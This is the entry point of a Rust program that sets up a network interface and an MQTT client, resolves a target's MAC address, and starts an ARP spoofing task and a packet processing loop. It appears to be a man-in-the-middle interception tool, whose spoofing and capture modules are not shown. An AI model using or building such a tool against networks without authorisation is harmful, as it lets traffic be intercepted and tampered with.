// $t@$h
mod net;
mod mqtt;
mod handlers;
mod types;

use net::{initialize_network, spawn_arp_spoofing_task};
use mqtt::initialize_mqtt_client;
use handlers::packet_processing_loop;
use types::*;

use log::info;
use anyhow::Result;

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();

    let (interface, source_mac, local_ip) = initialize_network()?;
    info!("Interface: {} MAC: {} IP: {}", interface.name, source_mac, local_ip);

    let target_mac = net::resolve_target_mac(&interface, local_ip, source_mac)?;
    let (mqtt_client, mut eventloop) = initialize_mqtt_client().await?;

    // Spawn MQTT listener
    tokio::spawn(async move {
        use rumqttc::Event;
        while let Ok(notification) = eventloop.poll().await {
            if let Event::Incoming(incoming) = notification {
                info!("MQTT incoming: {:?}", incoming);
            }
        }
    });

    spawn_arp_spoofing_task(interface.clone(), source_mac, target_mac, local_ip);
    packet_processing_loop(&interface, local_ip, source_mac, mqtt_client).await?;
    Ok(())
}
